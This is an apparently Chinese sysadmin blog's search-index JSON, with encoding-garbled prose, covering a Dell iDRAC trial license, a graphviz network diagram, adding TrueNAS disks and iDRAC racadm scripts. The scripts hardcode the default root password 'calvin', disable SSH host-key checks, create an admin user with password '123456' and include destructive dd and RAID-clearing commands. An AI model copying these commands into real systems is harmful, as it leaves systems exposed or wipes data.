class=\"cl\"\u003eHMBf115O7A2y6IZ9sXUHvH8V9QnDkWT1XHMn8GCW8HXOA5zA232OxiaRmQIDAQAB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eoywwKjAJBgNVHRMEAjAAMB0GA1UdDgQWBBQAoZ7yMjDHMAFtmmmO/zyz3BJ6hjAN\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBgkqhkiG9w0BAQUFAAOCAQEAHHgoOg57S+lAEejahdBE1HMwe6BF3b9bzUMCynn9\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e7buXa3cnRFO3H3674WKU6nBjv4nkT3qMyXwgi7MvXcu69msK4eM6QA8XeC7G1rD+\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2bb/ENR9R9Zo0BWLym/ij8uUA/BzX8hnbzWxN82+FMdY9WD4fJAJwJ5ZPEbU1Vfy\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e7wOWosHgDPXjeAhlhkxDQi6vlRTJdfED6tBY7iGD4AQXfzrHzAZpZlIvKbM2c54B\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e65wMSlqfEWMBDhT5qcwGCq82hmi7/sCtu9Z20g2s9F0fp4XlGX8L7l0hCa46zjay\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e37GffYsScEDFg/DmkIpcXnGzyx8l1msLzpj8Gt4zHhPlgA==\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:X509Certificate\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:X509Data\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:KeyInfo\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:Signature\u0026gt;\u0026lt;/lns:LicenseClass\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ–‡ä»¶ä¸‹è½½ï¼š\u003ca href=\"iDRAC7_Ent_Trial.xml\"\u003eiDRAC7_Ent_Trial.xml\u003c/a\u003e\u003c/p\u003e","title":"Dellå¾—Idracä¸´æ—¶license"},{"content":"graphvizæ˜¯å¾ˆå¼ºçƒˆçš„æè¿°è¯­è¨€ç»˜å›¾å·¥å…·\nå®‰è£…ï¼š\napt install graphviz æˆ– yum install graphviz ç”Ÿæˆpng\ndot -Tpng hn.gv -o hn.png vi hg.gv\rdigraph MyGraph {\rcompound = true\rmargin=\u0026quot;0,0\u0026quot;\rranksep = 1\rnodesep = 1\rrankdir=LR\r{rank=same;é˜²ç«å¢™;æ—¥å¿—å®¡è®¡}\rsubgraph cluster_app {\rlabel=\u0026quot;æµ·å—åº”ç”¨\u0026quot;\rrankdir=LR\rmargin = 10\r{rank=same;app01;app02}\rapp01 [label=\u0026quot;app01\\nå†…ç½‘ï¼š192.168.0.10\u0026quot;]\rapp02 [label=\u0026quot;app02\\nå†…ç½‘ï¼š192.168.0.11\u0026quot;]\rstorage01 [label=\u0026quot;storage01\\nå†…ç½‘ï¼š192.168.0.30\u0026quot;]\rsubgraph cluster_db {\rstyle = dotted\rlabel=\u0026quot;æ•°æ®åº“ä¸»/å¤‡\u0026quot;\r{rank=same;db02;db01}\rdb01 [label=\u0026quot;db01\\nå†…ç½‘ï¼š192.168.0.20\u0026quot;]\rdb02 [label=\u0026quot;db02\\nå†…ç½‘ï¼š192.168.0.21\u0026quot;]\rdb01 -\u0026gt; db02 [dir=both]\r}\rapp01 -\u0026gt; db01 [splines=true,lhead=cluster_db]\rapp02 -\u0026gt; db01 [splines=true,lhead=cluster_db]\rapp01 -\u0026gt; storage01\rapp02 -\u0026gt; storage01\r}\râ€‹\nsubgraph cluster_wjw {\rlabel=\u0026quot;å«å¥å§”\u0026quot;\rstyle = dotted\rmargin = 10\r{rank=same;front02;front01}\rfront01 [label=\u0026quot;front01\\nå†…ç½‘ï¼š192.168.0.5\u0026quot;]\rfront02 [label=\u0026quot;front02\\nå†…ç½‘ï¼š192.168.0.6\u0026quot;]\rfront01 -\u0026gt; front02 [dir=both]\r}\râ€‹\nå ¡å’æœº [shape=box,style=rounded,color=red,fontname=\u0026quot;wqy-microhei\u0026quot;,fontcolor=black,fontsize=16,label=\u0026quot;å ¡å’æœº\\nå¤–ç½‘ï¼š124.225.67.34\\nå†…ç½‘ï¼š192.168.0.40\u0026quot;]\ré˜²ç«å¢™ [shape=box,style=filled,color=green,fontname=\u0026quot;wqy-microhei\u0026quot;,fontsize=16,label=\u0026quot;é˜²ç«å¢™\\nå¤–ç½‘ï¼š124.225.200.190\\nå†…ç½‘ï¼š192.168.0.181\u0026quot;]\ræ—¥å¿—å®¡è®¡ [shape=box,style=filled,color=green,fontname=\u0026quot;wqy-microhei\u0026quot;, fontsize=16,label=\u0026quot;æ—¥å¿—å®¡è®¡\\nå¤–ç½‘ï¼š124.225.71.204\\nå†…ç½‘ï¼š192.168.0.41\u0026quot;]\rå ¡å’æœº -\u0026gt; é˜²ç«å¢™\ré˜²ç«å¢™ -\u0026gt; æ—¥å¿—å®¡è®¡\ré˜²ç«å¢™ -\u0026gt; app01 [lhead = cluster_app]\rstorage01 -\u0026gt; front01 [ltail = cluster_app, lhead= cluster_wjw]\r}\rç”Ÿæˆçš„å›¾: Ubuntuä¸‹å‘½ä»¤è¡Œæ‰“å¼€è¿™å›¾ xdg-open hn.png\nå‰å®³çš„å·¥å…·ï¼Œç”Ÿæˆçš„æ‰‹ç»˜å›¾ï¼š https://sketchviz.com/new\n","permalink":"https://rendoumi.com/posts/20230403-graphviz/","summary":"\u003cp\u003egraphvizæ˜¯å¾ˆå¼ºçƒˆçš„æè¿°è¯­è¨€ç»˜å›¾å·¥å…·\u003c/p\u003e\n\u003cp\u003eå®‰è£…ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install graphviz æˆ– yum install graphviz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç”Ÿæˆpng\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edot -Tpng hn.gv -o hn.png\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre\u003e\u003ccode\u003evi hg.gv\r\ndigraph MyGraph {\r\n  compound = true\r\n  margin=\u0026quot;0,0\u0026quot;\r\n  ranksep = 1\r\n  nodesep = 1\r\n  rankdir=LR\r\n  {rank=same;é˜²ç«å¢™;æ—¥å¿—å®¡è®¡}\r\n\r\n  subgraph cluster_app {\r\n    label=\u0026quot;æµ·å—åº”ç”¨\u0026quot;\r\n    rankdir=LR\r\n    margin = 10\r\n    {rank=same;app01;app02}\r\n    app01 [label=\u0026quot;app01\\nå†…ç½‘ï¼š192.168.0.10\u0026quot;]\r\n    app02 [label=\u0026quot;app02\\nå†…ç½‘ï¼š192.168.0.11\u0026quot;]\r\n    storage01 [label=\u0026quot;storage01\\nå†…ç½‘ï¼š192.168.0.30\u0026quot;]\r\n\r\n    subgraph cluster_db {\r\n      style = dotted\r\n      label=\u0026quot;æ•°æ®åº“ä¸»/å¤‡\u0026quot;\r\n      {rank=same;db02;db01}\r\n      db01 [label=\u0026quot;db01\\nå†…ç½‘ï¼š192.168.0.20\u0026quot;]\r\n      db02 [label=\u0026quot;db02\\nå†…ç½‘ï¼š192.168.0.21\u0026quot;]\r\n      db01 -\u0026gt; db02 [dir=both]\r\n    }\r\n\r\n    app01 -\u0026gt; db01 [splines=true,lhead=cluster_db]\r\n    app02 -\u0026gt; db01 [splines=true,lhead=cluster_db]\r\n    app01 -\u0026gt; storage01\r\n    app02 -\u0026gt; storage01\r\n  }\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eâ€‹\u003c/p\u003e","title":"åˆ©ç”¨graphvizæè¿°è¯­è¨€ç»˜å›¾"},{"content":"ä¹‹å‰å…¬å¸ä¸–çºªäº’è”å’Œæ— é”¡çš„TureNASç°æœ‰ç¡¬ç›˜éƒ½æ˜¯38å—ï¼Œæ»¡é…æ˜¯60å—ï¼Œæ‰€ä»¥éƒ½éœ€è¦æ‰©å®¹ï¼Œæ‰©æ»¡å†å¢åŠ 22å—ã€‚\nTrueNASçš„Raidæ˜¯ä½¿ç”¨çš„RaidZ3ï¼ŒåŸºäºZFSçš„ï¼Œæœ€å¤šå…è®¸3å—ç›˜å\né¦–å…ˆä¼šå»ºç«‹zpoolï¼Œç„¶ååœ¨zpoolé‡Œé¢å¢åŠ vdevï¼Œæ³¨æ„ï¼Œvdevä¸€æ—¦å¢åŠ ï¼Œä¸å¯æ›´æ”¹ã€‚\næˆ‘ä»¬è¿™é‡Œå°±çŠ¯äº†ç¬¬ä¸€ä¸ªé”™è¯¯ï¼Œæ‰€æœ‰vdevçš„ç£ç›˜æ•°é‡æœ€å¥½ç›¸ç­‰ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡åº”è¯¥å…ˆå¢åŠ 30å—ç›˜ï¼Œç„¶åç¬¬äºŒæ¬¡å†å¢åŠ 30å—ï¼Œè¿™æ ·ä¸¤ä¸ªvdevå°±æ˜¯å‡è¡¡çš„\nç°åœ¨æˆ‘ä»¬è¿™ç§çŠ¶å†µï¼Œç¬¬ä¸€ä¸ªvdevæ˜¯38å—ï¼Œç¬¬äºŒä¸ªvdevæ˜¯22å—ï¼Œä¸å¯¹ç­‰äº†ï¼Œä¼šè­¦å‘Š\nå…·ä½“æ·»åŠ æ­¥éª¤å¦‚ä¸‹ï¼š\né¦–å…ˆæµªæ½®å·¥ç¨‹å¸ˆåˆ°ç°åœºåŠ ç›˜ï¼Œç›˜å¿…é¡»åšå¥½æ¸…é™¤ä¿¡æ¯ï¼Œç”¨ä»¥ä¸‹å‘½ä»¤é€šè¿‡\ndd if=/dev/zero of=/dev/da59 bs=1M count=32 ç„¶åæ’å¥½ç›˜åï¼Œå¿…é¡»é‡å¯Trunasï¼Œæ‰èƒ½æ­£å¸¸è®¤å‡ºç›˜æ¥ï¼Œä¸èƒ½çƒ­æ’æ‹”ï¼ˆå¾ˆå¥‡æ€ªï¼‰ Storage \u0026ndash;\u0026gt; Pools \u0026ndash;\u0026gt; ç‚¹å‡»é½¿è½® \u0026ndash;\u0026gt; Add Vdevs\nç„¶åé€‰ä¸­æ‰€æœ‰å·¦è¾¹çš„Available Disksï¼Œç§»åˆ°å³è¾¹çš„Data VDevs ç„¶åçœ‹æœ€ä¸‹é¢ä¼šç«‹åˆ»å‡ºçº¢è‰²è­¦å‘Šï¼Œæç¤ºä¸¤ä¸ªvdevçš„disksä¸å¯¹ç­‰\nç‚¹å‡»ADD VDEVSï¼Œä¼šå¼¹çª—è­¦å‘Šï¼Œé€‰ä¸­Confirmï¼Œç„¶åç‚¹Continue\nä¼šç»§ç»­å¼¹å‡ºä¸€ä¸ªè­¦å‘Šçª—ï¼Œè¿™å›å°±æ˜æ™°äº†ï¼Œæ—§çš„æ•°æ®ä¸ä¼šç ´åï¼Œç„¶åç»§ç»­é€‰ä¸­Confirmï¼Œç„¶åç‚¹ADD VDEVS\nç„¶åå°±ä¼šå¼€å§‹åˆå§‹åŒ–ç¡¬ç›˜\næœ€åæŸ¥çœ‹zpoolï¼Œçœ‹åˆ°æœ‰ä¸¤ä¸ªRAIDZ3ï¼Œå°±åŠ å¥½äº†\n","permalink":"https://rendoumi.com/posts/20230331-truenas_adddisk/","summary":"\u003cp\u003eä¹‹å‰å…¬å¸ä¸–çºªäº’è”å’Œæ— é”¡çš„TureNASç°æœ‰ç¡¬ç›˜éƒ½æ˜¯38å—ï¼Œæ»¡é…æ˜¯60å—ï¼Œæ‰€ä»¥éƒ½éœ€è¦æ‰©å®¹ï¼Œæ‰©æ»¡å†å¢åŠ 22å—ã€‚\u003c/p\u003e\n\u003cp\u003eTrueNASçš„Raidæ˜¯ä½¿ç”¨çš„RaidZ3ï¼ŒåŸºäºZFSçš„ï¼Œæœ€å¤šå…è®¸3å—ç›˜å\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆä¼šå»ºç«‹zpoolï¼Œç„¶ååœ¨zpoolé‡Œé¢å¢åŠ vdevï¼Œæ³¨æ„ï¼Œvdevä¸€æ—¦å¢åŠ ï¼Œä¸å¯æ›´æ”¹ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬è¿™é‡Œå°±çŠ¯äº†ç¬¬ä¸€ä¸ªé”™è¯¯ï¼Œæ‰€æœ‰vdevçš„ç£ç›˜æ•°é‡æœ€å¥½ç›¸ç­‰ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡åº”è¯¥å…ˆå¢åŠ 30å—ç›˜ï¼Œç„¶åç¬¬äºŒæ¬¡å†å¢åŠ 30å—ï¼Œè¿™æ ·ä¸¤ä¸ªvdevå°±æ˜¯å‡è¡¡çš„\u003c/p\u003e\n\u003cp\u003eç°åœ¨æˆ‘ä»¬è¿™ç§çŠ¶å†µï¼Œç¬¬ä¸€ä¸ªvdevæ˜¯38å—ï¼Œç¬¬äºŒä¸ªvdevæ˜¯22å—ï¼Œä¸å¯¹ç­‰äº†ï¼Œä¼šè­¦å‘Š\u003c/p\u003e\n\u003cp\u003eå…·ä½“æ·»åŠ æ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæµªæ½®å·¥ç¨‹å¸ˆåˆ°ç°åœºåŠ ç›˜ï¼Œç›˜å¿…é¡»åšå¥½æ¸…é™¤ä¿¡æ¯ï¼Œç”¨ä»¥ä¸‹å‘½ä»¤é€šè¿‡\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edd \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/zero \u003cspan class=\"nv\"\u003eof\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/da59 \u003cspan class=\"nv\"\u003ebs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1M \u003cspan class=\"nv\"\u003ecount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e32\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch1 id=\"ç„¶åæ’å¥½ç›˜åå¿…é¡»é‡å¯trunasæ‰èƒ½æ­£å¸¸è®¤å‡ºç›˜æ¥ä¸èƒ½çƒ­æ’æ‹”å¾ˆå¥‡æ€ª\"\u003eç„¶åæ’å¥½ç›˜åï¼Œå¿…é¡»é‡å¯Trunasï¼Œæ‰èƒ½æ­£å¸¸è®¤å‡ºç›˜æ¥ï¼Œä¸èƒ½çƒ­æ’æ‹”ï¼ˆå¾ˆå¥‡æ€ªï¼‰\u003c/h1\u003e\n\u003cp\u003eStorage \u0026ndash;\u0026gt; Pools \u0026ndash;\u0026gt; ç‚¹å‡»é½¿è½® \u0026ndash;\u0026gt; Add Vdevs\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230331-truenas_adddisk/2022-04-13_093345.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åé€‰ä¸­æ‰€æœ‰å·¦è¾¹çš„Available Disksï¼Œç§»åˆ°å³è¾¹çš„Data VDevs\nç„¶åçœ‹æœ€ä¸‹é¢ä¼šç«‹åˆ»å‡ºçº¢è‰²è­¦å‘Šï¼Œæç¤ºä¸¤ä¸ªvdevçš„disksä¸å¯¹ç­‰\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230331-truenas_adddisk/2022-04-13_093530.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç‚¹å‡»ADD VDEVSï¼Œä¼šå¼¹çª—è­¦å‘Šï¼Œé€‰ä¸­Confirmï¼Œç„¶åç‚¹Continue\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230331-truenas_adddisk/2022-04-13_093714.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¼šç»§ç»­å¼¹å‡ºä¸€ä¸ªè­¦å‘Šçª—ï¼Œè¿™å›å°±æ˜æ™°äº†ï¼Œæ—§çš„æ•°æ®ä¸ä¼šç ´åï¼Œç„¶åç»§ç»­é€‰ä¸­Confirmï¼Œç„¶åç‚¹ADD VDEVS\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230331-truenas_adddisk/2022-04-13_093847.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åå°±ä¼šå¼€å§‹åˆå§‹åŒ–ç¡¬ç›˜\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230331-truenas_adddisk/2022-04-13_094112.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæœ€åæŸ¥çœ‹zpoolï¼Œçœ‹åˆ°æœ‰ä¸¤ä¸ªRAIDZ3ï¼Œå°±åŠ å¥½äº†\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230331190700157\" loading=\"lazy\" src=\"/posts/20230331-truenas_adddisk/image-20230331190700157.png\"\u003e\u003c/p\u003e","title":"TrueNASç³»ç»Ÿå¦‚ä½•å¢åŠ æ–°ç¡¬ç›˜"},{"content":"æ”¶å½•ä¸€ä¸‹ dell æœåŠ¡å™¨ idrac æ“ä½œå¸¸ç”¨è„šæœ¬\næ˜¾ç¤ºRaidå¡ç¡¬ç›˜\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get controllers\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get vdisks\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get pdisks æ¸…ç†Foreignç£ç›˜çŠ¶æ€\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm storage clearconfig:RAID.Integrated.1-1\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\råˆ é™¤vdisk\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.5.14 racadm raid deletevd:Disk.Virtual.0:RAID.Integrated.1-1\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\rå»ºç«‹Raid0\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid createvd:RAID.Integrated.1-1 -rl r0 -wp wb -rp ra -name raid_0 -pdkey:Disk.Bay.0:Enclosure.Internal.0-1:RAID.Integrated.1-1\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\rå»ºç«‹Raid5\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid createvd:RAID.Integrated.1-1 -rl r5 -wp wb -rp ra -name raid_5 -pdkey:Disk.Bay.1:Enclosure.Internal.0-1:RAID.Integrated.1-1,Disk.Bay.2:Enclosure.Internal.0-1:RAID.Integrated.1-1,Disk.Bay.3:Enclosure.Internal.0-1:RAID.Integrated.1-1\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\ré‡å¯æœåŠ¡å™¨\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm serveraction hardreset\rè®¾ç½®ç¡¬ç›˜ç¬¬ä¸€å¯åŠ¨ï¼Œç¦æ­¢F1/F2ç­‰å¾…\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set BIOS.biosbootsettings.BootSeq HardDisk.List.1-1,NIC.Integrated.1-1-1\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set BIOS.MiscSettings.ErrPrompt Disabled\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.5.16 racadm jobqueue create BIOS.Setup.1-1 sshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm serveraction hardreset\rè®¾ç½®vnc\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.vncserver.enable Enabled\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.vncserver.Password calvin\rè®¾ç½®idracå…¶ä»–ç”¨æˆ·\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminUserName -i 4 newuser\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPassword -i 4 123456\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPrivilege -i 4 0x000001ff\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminEnable -i 4 1\ræ”¹æ‰å¯†ç \rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPassword -i 4 987654\rNTPçš„è®¾ç½®\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.ipv4static.dns1 8.8.8.8\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp1 0.asia.pool.ntp.org\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp2 1.asia.pool.ntp.org\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp3 2.asia.pool.ntp.org\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp1 129.250.35.250\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp2 180.211.88.50\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp3 202.112.29.82\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.NTPEnable Enabled\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.NTPMaxDist 16\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.time.timezone Japan\rä¿®æ”¹ç½‘å¡å¯åŠ¨ä¸ºLegacy PXE\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm get nic.nicconfig.1 | grep Legacy\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set nic.nicconfig.1.legacybootproto PXE\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm get nic.nicconfig.1 | grep Legacy\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create NIC.Integrated.1-1-1\ripmitool -I lanplus -H $ip -U root -P calvin chassis power reset ","permalink":"https://rendoumi.com/posts/20230331-idrac_dell/","summary":"\u003cp\u003eæ”¶å½•ä¸€ä¸‹ dell æœåŠ¡å™¨ idrac æ“ä½œå¸¸ç”¨è„šæœ¬\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eæ˜¾ç¤ºRaidå¡ç¡¬ç›˜\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get controllers\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get vdisks\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get pdisks \r\n\r\næ¸…ç†Foreignç£ç›˜çŠ¶æ€\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm  storage clearconfig:RAID.Integrated.1-1\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\r\n\r\nåˆ é™¤vdisk\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.5.14 racadm raid deletevd:Disk.Virtual.0:RAID.Integrated.1-1\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\r\n\r\nå»ºç«‹Raid0\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid createvd:RAID.Integrated.1-1 -rl r0 -wp wb -rp ra -name raid_0 -pdkey:Disk.Bay.0:Enclosure.Internal.0-1:RAID.Integrated.1-1\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\r\n\r\nå»ºç«‹Raid5\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid createvd:RAID.Integrated.1-1 -rl r5 -wp wb -rp ra -name raid_5 -pdkey:Disk.Bay.1:Enclosure.Internal.0-1:RAID.Integrated.1-1,Disk.Bay.2:Enclosure.Internal.0-1:RAID.Integrated.1-1,Disk.Bay.3:Enclosure.Internal.0-1:RAID.Integrated.1-1\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\r\n\r\né‡å¯æœåŠ¡å™¨\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm serveraction 